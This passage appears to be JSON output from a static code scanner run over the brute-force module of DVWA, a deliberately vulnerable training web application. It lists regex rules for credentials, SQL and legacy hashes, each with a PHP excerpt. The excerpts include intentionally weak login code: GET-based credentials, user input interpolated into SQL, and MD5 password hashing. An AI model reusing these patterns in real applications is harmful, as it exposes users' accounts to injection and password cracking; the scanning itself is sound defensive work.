        "excerpt": "\t\tsleep( rand( 2, 4 ) );\n\n\t\t// Give the user some feedback\n\t\t$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in {$lockout_time} minutes&lt;/em&gt;.&lt;/pre&gt;&quot;;\n\n\t\t// Update bad login count\n\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#39; );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );\n\t\t$data-&gt;execute();\n",
        "startLocationLine": 85,
        "startLocationColumn": 24,
        "endLocationLine": 85,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "&lt;?php\n\nif( isset( $_POST[ &#39;Login&#39; ] ) &amp;&amp; isset ($_POST[&#39;username&#39;]) &amp;&amp; isset ($_POST[&#39;password&#39;]) ) {\n\t// Check Anti-CSRF token\n\tcheckToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );\n\n\t// Sanitise username input\n\t$user = $_POST[ &#39;username&#39; ];\n",
        "startLocationLine": 3,
        "startLocationColumn": 80,
        "endLocationLine": 3,
        "endLocationColumn": 88
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\n\t// Sanitise password input\n\t$pass = $_POST[ &#39;password&#39; ];\n\t$pass = stripslashes( $pass );\n\t$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass = md5( $pass );\n\n\t// Default values\n",
        "startLocationLine": 13,
        "startLocationColumn": 19,
        "endLocationLine": 13,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t}\n\n\t// Check the database (if username matches the password)\n\t$data = $db-&gt;prepare( &#39;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR);\n\t$data-&gt;bindParam( &#39;:password&#39;, $pass, PDO::PARAM_STR );\n\t$data-&gt;execute();\n\t$row = $data-&gt;fetch();\n\n",
        "startLocationLine": 53,
        "startLocationColumn": 70,
        "endLocationLine": 53,
        "endLocationColumn": 78
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t}\n\n\t// Check the database (if username matches the password)\n\t$data = $db-&gt;prepare( &#39;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR);\n\t$data-&gt;bindParam( &#39;:password&#39;, $pass, PDO::PARAM_STR );\n\t$data-&gt;execute();\n\t$row = $data-&gt;fetch();\n\n",
        "startLocationLine": 53,
        "startLocationColumn": 83,
        "endLocationLine": 53,
        "endLocationColumn": 91
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t// Check the database (if username matches the password)\n\t$data = $db-&gt;prepare( &#39;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR);\n\t$data-&gt;bindParam( &#39;:password&#39;, $pass, PDO::PARAM_STR );\n\t$data-&gt;execute();\n\t$row = $data-&gt;fetch();\n\n\t// If its a valid login...\n\tif( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) {\n",
        "startLocationLine": 55,
        "startLocationColumn": 22,
        "endLocationLine": 55,
        "endLocationColumn": 30
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t$last_login   = $row[ &#39;last_login&#39; ];\n\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;{$user}&lt;/em&gt;&lt;/p&gt;&quot;;\n\t\t$html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;;\n\n\t\t// Had the account been locked out since last login?\n\t\tif( $failed_login &gt;= $total_failed_login ) {\n\t\t\t$html .= &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;;\n",
        "startLocationLine": 67,
        "startLocationColumn": 31,
        "endLocationLine": 67,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\tsleep( rand( 2, 4 ) );\n\n\t\t// Give the user some feedback\n\t\t$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in {$lockout_time} minutes&lt;/em&gt;.&lt;/pre&gt;&quot;;\n\n\t\t// Update bad login count\n\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#39; );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );\n\t\t$data-&gt;execute();\n",
        "startLocationLine": 85,
        "startLocationColumn": 40,
        "endLocationLine": 85,
        "endLocationColumn": 48
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&#39;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#39; );",
        "excerpt": "\t$account_locked     = false;\n\n\t// Check the database (Check user information)\n\t$data = $db-&gt;prepare( &#39;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#39; );\n\t$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );\n\t$data-&gt;execute();\n\t$row = $data-&gt;fetch();\n\n\t// Check to see if the user has been locked out.\n",
        "startLocationLine": 24,
        "startLocationColumn": 24,
        "endLocationLine": 24,
        "endLocationColumn": 102
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&#39;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );",
        "excerpt": "\t}\n\n\t// Check the database (if username matches the password)\n\t$data = $db-&gt;prepare( &#39;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR);\n\t$data-&gt;bindParam( &#39;:password&#39;, $pass, PDO::PARAM_STR );\n\t$data-&gt;execute();\n\t$row = $data-&gt;fetch();\n\n",
        "startLocationLine": 53,
        "startLocationColumn": 24,
        "endLocationLine": 53,
        "endLocationColumn": 106
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&#39;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#39; );",
        "excerpt": "\t\t}\n\n\t\t// Reset bad login count\n\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#39; );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );\n\t\t$data-&gt;execute();\n\t} else {\n\t\t// Login failed\n\t\tsleep( rand( 2, 4 ) );\n",
        "startLocationLine": 77,
        "startLocationColumn": 25,
        "endLocationLine": 77,
        "endLocationColumn": 96
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&#39;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#39; );",
        "excerpt": "\t\t$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in {$lockout_time} minutes&lt;/em&gt;.&lt;/pre&gt;&quot;;\n\n\t\t// Update bad login count\n\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#39; );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );\n\t\t$data-&gt;execute();\n\t}\n\n\t// Set the last login time\n",
        "startLocationLine": 88,
        "startLocationColumn": 25,
        "endLocationLine": 88,
        "endLocationColumn": 111
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&#39;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#39; );",
        "excerpt": "\t}\n\n\t// Set the last login time\n\t$data = $db-&gt;prepare( &#39;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#39; );\n\t$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );\n\t$data-&gt;execute();\n}\n\n// Generate Anti-CSRF token\n",
        "startLocationLine": 94,
        "startLocationColumn": 24,
        "endLocationLine": 94,
        "endLocationColumn": 95
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t$pass = $_POST[ &#39;password&#39; ];\n\t$pass = stripslashes( $pass );\n\t$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass = md5( $pass );\n\n\t// Default values\n\t$total_failed_login = 3;\n\t$lockout_time       = 15;\n\t$account_locked     = false;\n",
        "startLocationLine": 16,
        "startLocationColumn": 10,
        "endLocationLine": 16,
        "endLocationColumn": 13
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/medium.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Login",
        "excerpt": "&lt;?php\n\nif( isset( $_GET[ &#39;Login&#39; ] ) ) {\n\t// Sanitise username input\n\t$user = $_GET[ &#39;username&#39; ];\n\t$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\n\t// Sanitise password input\n",
        "startLocationLine": 3,
        "startLocationColumn": 20,
        "endLocationLine": 3,
        "endLocationColumn": 25
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/medium.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "username",
        "excerpt": "\nif( isset( $_GET[ &#39;Login&#39; ] ) ) {\n\t// Sanitise username input\n\t$user = $_GET[ &#39;username&#39; ];\n\t$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\n\t// Sanitise password input\n\t$pass = $_GET[ &#39;password&#39; ];\n\t$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n",
        "startLocationLine": 5,
        "startLocationColumn": 18,
        "endLocationLine": 5,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/medium.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\n\t// Sanitise password input\n\t$pass = $_GET[ &#39;password&#39; ];\n\t$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass = md5( $pass );\n\n\t// Check the database\n\t$query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;\n",
        "startLocationLine": 9,
        "startLocationColumn": 18,
        "endLocationLine": 9,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/medium.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t$pass = md5( $pass );\n\n\t// Check the database\n\t$query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\tif( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {\n\t\t// Get users details\n\t\t$row    = mysqli_fetch_assoc( $result );\n",
        "startLocationLine": 14,
        "startLocationColumn": 60,
        "endLocationLine": 14,
        "endLocationColumn": 68
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/medium.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t$avatar = $row[&quot;avatar&quot;];\n\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;\n\t\t$html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;;\n\t}\n\telse {\n\t\t// Login failed\n\t\tsleep( 2 );\n",
        "startLocationLine": 23,
        "startLocationColumn": 31,
        "endLocationLine": 23,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/medium.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Username",
        "excerpt": "\telse {\n\t\t// Login failed\n\t\tsleep( 2 );\n\t\t$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;\n\t}\n\n\t((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);\n}\n\n",
        "startLocationLine": 29,
        "startLocationColumn": 24,
        "endLocationLine": 29,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/medium.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\telse {\n\t\t// Login failed\n\t\tsleep( 2 );\n\t\t$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;\n\t}\n\n\t((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);\n}\n\n",
        "startLocationLine": 29,
        "startLocationColumn": 40,
        "endLocationLine": 29,
        "endLocationColumn": 48
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/medium.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\tif( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {\n\t\t// Get users details\n\t\t$row    = mysqli_fetch_assoc( $result );\n\t\t$avatar = $row[&quot;avatar&quot;];\n\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;\n\t\t$html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;;\n\t}\n",
        "startLocationLine": 20,
        "startLocationColumn": 4,
        "endLocationLine": 20,
        "endLocationColumn": 10
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/medium.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\tif( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {\n\t\t// Get users details\n\t\t$row    = mysqli_fetch_assoc( $result );\n\t\t$avatar = $row[&quot;avatar&quot;];\n\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;\n\t\t$html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;;\n\t}\n",
        "startLocationLine": 20,
        "startLocationColumn": 19,
        "endLocationLine": 20,
        "endLocationColumn": 25
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/medium.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;\n\t\t$html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;;\n\t}\n\telse {\n\t\t// Login failed\n\t\tsleep( 2 );\n\t\t$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;\n",
        "startLocationLine": 24,
        "startLocationColumn": 26,
        "endLocationLine": 24,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/medium.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(username|userid|passphrase|secret|credential|credentials)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "username",
        "excerpt": "\nif( isset( $_GET[ &#39;Login&#39; ] ) ) {\n\t// Sanitise username input\n\t$user = $_GET[ &#39;username&#39; ];\n\t$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\n\t// Sanitise password input\n\t$pass = $_GET[ &#39;password&#39; ];\n\t$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n",
        "startLocationLine": 5,
        "startLocationColumn": 18,
        "endLocationLine": 5,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/medium.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(username|userid|passphrase|secret|credential|credentials)\\b",
